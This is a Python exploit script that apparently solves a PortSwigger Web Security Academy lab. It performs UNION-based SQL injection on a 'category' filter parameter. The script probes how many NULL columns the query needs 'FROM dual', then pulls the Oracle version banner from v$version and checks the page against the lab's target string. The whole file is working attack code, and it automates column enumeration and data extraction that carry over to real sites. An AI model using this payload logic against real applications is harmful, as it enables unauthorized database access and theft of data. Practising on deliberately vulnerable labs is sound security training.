import requests
import bs4
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def fetch_string_literal(text):
    soup = bs4.BeautifulSoup(text, "html.parser")
    string_value = soup.find('p', attrs={'id': 'hint'})
    _string = string_value.get_text(strip=True)
    _string = _string.split("'")[1]
    print("the target string is:\n " + _string)
    return _string

def string_fetched_final_request(text):
    soup = bs4.BeautifulSoup(text, "html.parser")
    visible = soup.get_text(separator=" ", strip=True)
    return visible

def check_internal_server_error(text):
    soup = bs4.BeautifulSoup(text, "html.parser")
    error_tag = soup.find('p', attrs={'class': 'is-warning'})
    if error_tag:
        error = error_tag.get_text(strip=True)
    else:
        error = None
    return error != "Internal Server Error"

def normalize_remove_whitespace(s: str) -> str:
    return "".join(s.split())

def ascii_sequence(s: str):
    return [ord(ch) for ch in s]

def ascii_subsequence_match(target, haystack):
    t_norm = normalize_remove_whitespace(target)
    h_norm = normalize_remove_whitespace(haystack)

    t_seq = ascii_sequence(t_norm)
    h_seq = ascii_sequence(h_norm)

    t_len = len(t_seq)
    h_len = len(h_seq)

    if t_len == 0:
        return False

    for i in range(0, h_len - t_len + 1):
        match = True
        for j in range(t_len):
            if h_seq[i + j] != t_seq[j]:
                match = False
                break
        if match:
            return True
    return False

def main():
    host = 'https://0a550051048d67d480af087800900036.web-security-academy.net'
    endpoint = "/filter?category="
    client = requests.Session()
    client.verify = False

    target_string = fetch_string_literal(client.get(host).text)

    payload_base = f"{host}{endpoint}'UNION SELECT "
    nulls = ["null"]
    from_string = " FROM dual"
    comment = "--"

    while True:
        payload_to_check = payload_base + ",".join(nulls) + from_string + comment
        print("executed payload: " + payload_to_check)
        response = client.get(payload_to_check)
        if not check_internal_server_error(response.text):
            nulls.append("null")
        else:
            break

    nulls[0] = "BANNER"
    from_string = " FROM v$version" # getting version for oracle DB
    crafted_payload = payload_base + ",".join(nulls) + from_string + comment
    print("Final Payload: " + crafted_payload)
    page_visible_text = string_fetched_final_request(client.get(crafted_payload).text)
    target_string=normalize_remove_whitespace(target_string)
    page_visible_text=normalize_remove_whitespace(page_visible_text)
    print(target_string)
    print(page_visible_text)
    matched = target_string==page_visible_text
    if matched:
        print(f'[+] Lab Solved LESSGOOOOO')
    else:
        print('Try harder noob!')
        

if __name__ == "__main__":
    main()
